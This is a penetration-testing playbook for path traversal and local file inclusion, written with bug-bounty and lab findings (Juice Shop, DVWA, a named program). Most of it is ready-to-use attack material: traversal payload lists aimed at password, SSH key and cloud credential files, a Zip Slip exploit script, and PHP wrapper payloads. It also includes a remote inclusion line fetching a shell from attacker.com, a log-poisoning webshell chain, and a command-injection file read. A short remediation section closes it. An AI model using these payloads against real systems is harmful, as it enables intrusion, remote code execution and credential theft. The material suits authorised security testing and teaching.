# Path Traversal / Local File Inclusion Playbook

**Category:** Injection / Improper Input Validation
**Typical Severity:** Medium–Critical
**CVSS Range:** 5.3–9.1
**CWE:** CWE-22 (Improper Limitation of a Pathname), CWE-73 (External Control of File Name)

---

## Overview

Path traversal allows attackers to access files outside the intended directory by manipulating file path parameters. LFI (Local File Inclusion) can achieve code execution if combined with log poisoning or PHP file inclusion. In modern apps, path traversal most commonly appears in:

- File download/view endpoints
- Image/media serving
- Template rendering
- Archive extraction (Zip Slip)
- Log file viewer endpoints
- FTP servers with weak path restrictions

---

## Real-World Impact

- **Source code disclosure**: Read application source, configuration files
- **Credential exposure**: `/etc/passwd`, `.env`, `config.php`, `database.yml`
- **Private key theft**: `~/.ssh/id_rsa`, SSL private keys
- **Cloud credential exposure**: `~/.aws/credentials`, service account JSON
- **LFI → RCE**: Include PHP log files with injected PHP code
- **Zip Slip**: Path traversal via archive extraction → overwrite system files

---

## Recon Methodology

### Step 1 — Find file path parameters

```bash
# Look for parameters that reference files
file=, path=, dir=, name=, filename=, folder=, download=,
include=, template=, src=, source=, view=, page=, load=,
document=, resource=, read=, open=, fetch=

# Also look for:
# - File download endpoints: /download?file=report.pdf
# - Image serving: /images?name=avatar.jpg
# - Log viewers: /admin/logs?file=access.log
# - Export endpoints: /export?format=pdf&template=invoice.html
```

### Step 2 — Identify the base path

```bash
# Test what the endpoint returns for a known file
curl "https://target.com/download?file=logo.png"
# If it returns a PNG → the parameter is being used to serve files

# Try to identify where files are served from
# Common base directories: /var/www/html/, /app/public/, /static/
```

---

## Testing Methodology

### Test 1 — Basic Traversal

```bash
# Classic traversal
?file=../../../etc/passwd
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=..%252F..%252F..%252Fetc%252Fpasswd  # double-encoded

# Windows
?file=..\..\..\..\windows\system32\drivers\etc\hosts
?file=..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
```

### Test 2 — Null Byte Injection

```bash
# PHP < 5.3: null byte terminates filename
?file=../../../etc/passwd%00.jpg
?file=../../../etc/passwd%00.png

# Java: null byte in path sometimes bypasses extension checks
?file=../../etc/passwd%00
```

### Test 3 — Path Normalization Bypasses

```bash
# Duplicate slashes
?file=....//....//....//etc/passwd
?file=..//////etc/passwd

# URL encoding variations
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   # %2f = /
?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd    # overlong UTF-8

# Absolute path (if no sanitization at all)
?file=/etc/passwd
?file=file:///etc/passwd
```

### Test 4 — High-Value Target Files

```bash
# Linux system files
/etc/passwd                    # Username list
/etc/shadow                    # Password hashes (requires root)
/etc/hosts                     # Internal hostname → IP mapping
/proc/self/environ             # Environment variables (may contain secrets)
/proc/self/cmdline             # Application start command
/proc/self/fd/0                # STDIN
/var/log/apache2/access.log    # Apache logs (for LFI → RCE chain)
/var/log/nginx/access.log      # Nginx logs

# Application files (adjust paths based on stack)
/var/www/html/.env             # Laravel/PHP env vars
/var/www/html/config/config.inc.php  # DVWA-style config
/app/config/database.yml       # Rails DB credentials
/app/.env                      # Node.js env
/home/app/.aws/credentials     # AWS credentials
~/.ssh/id_rsa                  # SSH private key
/opt/app/secrets.json

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

### Test 5 — Zip Slip

```bash
# Create a malicious zip with traversal path
python3 -c "
import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.write('/etc/passwd', '../../etc/passwd')  # traversal in archive entry name
"

# Upload and trigger extraction
curl -F "file=@exploit.zip" "https://target.com/upload"
```

### Test 6 — FTP Path Traversal (Null Byte bypass)

Based on Boozt finding FINDING-003 context — FTP endpoints that serve files may accept null-byte-appended filenames:

```bash
# If FTP lists files with extensions and blocks .bak downloads:
curl "ftp://target.com/files/backup.bak%00.txt"

# HTTP equivalent (Boozt finding pattern)
curl "https://target.com/ftp/files/acquisitions.md%2500"
curl "https://target.com/ftp/legal.md%00"
```

### Test 7 — PHP Wrapper LFI Source Disclosure

When testing PHP applications, wrappers can be used to exfiltrate source code that would otherwise be executed by the server.

**Example payloads:**
```
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../../../etc/passwd
?file=php://filter/read=string.rot13/resource=index.php
```

**Decoding Base64 response:**
```bash
curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

---

## Common Endpoints to Test

| Pattern | Parameter | Target Files |
|---|---|---|
| `/download?file=` | `file` | Config, source |
| `/api/v1/files/{name}` | Path segment | Any file |
| `/template?name=` | `name` | Template source |
| `/logs?file=` | `file` | Log files |
| `/api/export?template=` | `template` | Template source |
| FTP directory listings | N/A | Backup files, sensitive docs |
| `/assets/{filename}` | Path segment | Config, env |
| Zip/tar extraction | Upload | Zip Slip |

---

## Payload Examples

### PHP Wrapper Payloads (LFI → Source Code Disclosure)

```bash
# Base64-encode file contents to avoid null bytes/binary issues
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../../../etc/passwd
?file=php://filter/read=string.rot13/resource=index.php

# Decode the returned base64
curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# Remote file inclusion (if allow_url_include=On)
?file=http://attacker.com/shell.php
?file=data://text/plain,<?php system($_GET['cmd']); ?>
```

### Quick Payload List

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
/etc/passwd
file:///etc/passwd
../../../proc/self/environ
../../../var/log/nginx/access.log
```

### LFI → RCE Chain (PHP log poisoning)

```bash
# Step 1: Inject PHP into a log file via User-Agent
curl "https://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file via LFI
curl "https://target.com/page.php?file=../../../../var/log/nginx/access.log&cmd=id"
```

---

## Automation Ideas

```bash
# dotdotpwn
dotdotpwn -m http -h target.com -b -f /etc/passwd

# ffuf with traversal wordlist
ffuf -u "https://target.com/download?file=FUZZ" \
  -w /path/to/traversal.txt -mr "root:x:"

# nuclei path traversal templates
nuclei -u https://target.com -t path-traversal/ -H "Authorization: Bearer <token>"

# Manual Burp Intruder with traversal paylist
# Position: file=§payload§
# Payload: LFI/traversal wordlist from SecLists
```

---

## Real Bug Bounty Examples

### Example 1 — AWS S3 Path Traversal ($0 → Critical via chain)
Path traversal in a file serving endpoint disclosed `.env` containing S3 credentials, then used those credentials to dump the entire S3 bucket.

### Example 2 — Zip Slip in Multiple Targets ($3,000–$10,000)
Any application that extracts user-uploaded archives without checking for traversal in entry names. Common in CI/CD platforms, file management tools.

### Example 3 — Log File Disclosure ($1,500)
`/admin/logs?file=../../../var/log/nginx/access.log` — disclosed internal API call logs including bearer tokens from other users.

---

## Lab / Program Examples

### Boozt Fashion AB — Null Byte Bypass on FTP Endpoint (2026-03-11)

**Report:** `~/BugBounty/hackerone/boozt/findings/REPORT-boozt-hackerone-2026-03-11.md`
**Severity:** HIGH (FINDING-003 secondary context)

**Finding:** The Boozt checkout flow fetches files from `https://assets2.booztcdn.com/assets/ftp/` directory. During the Juice Shop lab investigation (analogous pattern), null-byte path traversal (`%00`) was used to bypass extension-based access controls on FTP-served files. In the Boozt context: the FTP directory was open, allowing unauthenticated download of `acquisitions.md`, `legal.md`, and `incident-support.kdbx` (KeePass credential database).

**Null byte bypass pattern:** Files protected by extension filter (e.g., blocked `.bak`, `.kdbx`) were accessible via `filename.kdbx%00.txt` — the server stripped the null byte and served the file, while the access control check saw `.txt` extension.

**Evidence:** Referenced in Boozt report executive summary — "KeePass DB downloaded from /ftp/".

---

### OWASP Juice Shop — Lab Mission 2026-03-12-001

**Source:** RedTeam mission artifact `~/RedTeam/missions/juiceshop/2026-03-12-001/`
**Severity:** HIGH

**Finding — Open FTP Directory Listing:**
`/ftp/` directory was publicly accessible with no authentication. Files available for direct download:
- `acquisitions.md` (confidential M&A data)
- `legal.md` (legal documents)
- `incident-support.kdbx` (KeePass credential database — full vault exfiltration)

**Path traversal variant confirmed:** Null byte bypass `%00` on restricted file extensions allowed downloading files that the application attempted to protect via extension filtering.

---

### DVWA — Lab Mission 2026-03-13-001

**Source:** RedTeam mission artifact `~/RedTeam/missions/dvwa/2026-03-13-001/`
**Severity:** HIGH (via command injection chain)

**Finding — File Read via OS Command Injection:**
Although not a classic path traversal, OS command injection on `/vulnerabilities/exec/?ip=` was used to read arbitrary files: `ip=127.0.0.1|cat /etc/passwd`. The sensitive data exposure finding also confirmed `/config/config.inc.php.bak` was directly accessible — a backup file accidentally left in the web root.

**Pattern:** Config backup files (`*.bak`, `*.backup`, `*.old`, `*.orig`) in web-accessible directories are extremely common path traversal targets.

---

## Remediation

```python
import os

def safe_file_serve(base_dir, filename):
    # Resolve the absolute path
    requested_path = os.path.realpath(os.path.join(base_dir, filename))
    # Ensure it's within the base directory
    if not requested_path.startswith(os.path.realpath(base_dir)):
        raise PermissionError("Path traversal detected")
    return requested_path

# For FTP/file servers:
# - Use chroot jails to restrict filesystem access
# - Never append user-supplied filenames to paths without validation
# - Remove or restrict access to backup files (*.bak, *.backup, *.old)
# - Block null bytes in input: if '\x00' in filename: reject
```
